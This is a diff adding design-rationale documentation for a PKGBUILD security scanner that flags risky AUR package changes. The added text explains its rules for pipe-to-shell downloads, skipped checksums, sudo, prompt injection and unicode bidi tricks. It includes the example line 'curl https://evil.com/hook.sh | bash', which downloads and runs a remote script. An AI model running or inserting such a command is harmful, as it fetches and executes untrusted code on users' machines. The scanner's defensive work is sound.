@@ -75,3 +75,43 @@ Same lesson. A change of maintainer is a flag for investigation; it means the pa
 ## Why weights are derived from corpus frequency, not asserted
 
 R006 (certain source-array patterns) was originally classified as HIGH/25. Corpus analysis showed it fires on >30% of all AUR packages; it's a census, not a signal. It was demoted to LOW/5. Every weight is validated against corpus frequency. A rule that fires on most packages is not signalling anything useful.
+
+## Rule design decisions
+
+### R001 and R002: why separate rules for curl and wget
+
+Curl and wget are the two most common tools for fetching remote content in PKGBUILDs. Combining them into a single rule would make it harder to tune: a user who accepts wget pipe patterns but wants to block curl pipe patterns would have to disable the combined rule entirely. Separate rules per tool let users choose which network tools to allow.
+
+Matched against resolved strings because the URL or flags might be in a variable. The pattern catches the pipe to a shell, not just the presence of curl or wget alone.
+
+### R012 and R013: why FATAL instead of CRITICAL
+
+FATAL rules (R012 prompt injection, R013 unicode bidi) are fundamentally different from CRITICAL rules. A CRITICAL rule like `curl | bash` fires on a specific command pattern that is almost always malicious. A FATAL rule fires on a pattern that, when present, indicates active manipulation of the reviewer's perception.
+
+Prompt injection and unicode bidi overrides are attacks on the reviewer, not on the build process. They attempt to hide what the PKGBUILD does. When these fire, the score hard-stops at 100 because a package that tries to deceive the reviewer cannot be trusted regardless of other signals. The 0 weight means they contribute nothing to the additive score; the hard stop is their entire effect.
+
+Low recall is acceptable for these rules. R012 has 17% recall on the benchmark corpus. It is a tripwire: when it fires, the package is almost certainly malicious. When it does not, nothing can be concluded. The primary defence against prompt injection is the verdict-integrity assertions in the LLM translation stage, not the rule itself.
+
+### R004 and R005: why checksum rules are hard-coded
+
+Checksum integrity is foundational to the entire scoring system. Every other signal is evaluated in the context of whether checksums are present or disabled. Allowing users to disable R004 or R005 through `rules.toml` would produce misleading results: a package with `sha256sums=('SKIP')` that otherwise looks clean would score 0, but the missing checksum is itself a risk.
+
+These rules are hard-coded in `src/trustsight/analysis.py` and cannot be disabled through configuration. R004 has automatic justification detection: if the diff contains a VCS source (`git+https://`, `.git`), a signature file (`.sig`, `.asc`), a `validpgpkeys` declaration, or a DKMS reference, the severity is downgraded from HIGH (weight 25) to INFO (weight 0). The justification checks whether the checksum skip is structurally explained, not whether it is safe.
+
+### R009: why sudo detection is scoped to function_body
+
+A naive `sudo` rule that matches anywhere in the PKGBUILD would fire on comments, examples in the `pkgdesc()`, and top-level variable assignments like `groups=('sudo')`. The function_body scope restricts matching to the actual build functions (`build()`, `package()`, `check()`), where a `sudo` command would have real effect. This was a result of corpus fire-rate analysis showing that unfiltered sudo matching was a census signal.
+
+### C001, C002, C003: why code rules exist
+
+Code rules (C-series) enforce structural invariants that cannot be expressed as a single regex match. C001 fires when a checksum changed without a source URL change and without a version bump: the checksum changed but nothing else did, which is anomalous. C002 is the same check but with a version bump present: normal during routine updates, recorded for audit only. C003 fires when source URLs changed without a version bump.
+
+These rules are hard-coded because they depend on comparing multiple parsed fields (checksum state, source URL set, pkgver value). Writing them as TOML patterns would require embedding logic in regex, which is fragile and unreadable. The C-series namespace also prevents users from accidentally disabling structural invariants that the scoring model depends on.
+
+### Why match_target has two values
+
+Rules matched against `resolved` strings see the post-variable-expansion PKGBUILD. This catches patterns where the malicious command is hidden behind a variable: `curl $url | $shell` in the diff line becomes `curl https://evil.com/hook.sh | bash` after resolution.
+
+Rules matched against `raw_line` strings see the literal PKGBUILD text. This catches patterns in the structure of the PKGBUILD itself: a `sha256sums=('SKIP')` declaration, a unicode bidi override character in a string literal, or a `.install` file reference.
+
+The two-target design exists because PKGBUILDs encode meaning in both their text (structure, declarations) and their resolved values (commands, URLs). A pattern like `sudo` is meaningful in the raw text (where it can be seen and reviewed) but meaningless when resolved (sudo is not a variable). A pattern like `curl | bash` is meaningful only after resolution (where the actual URL and shell are known).
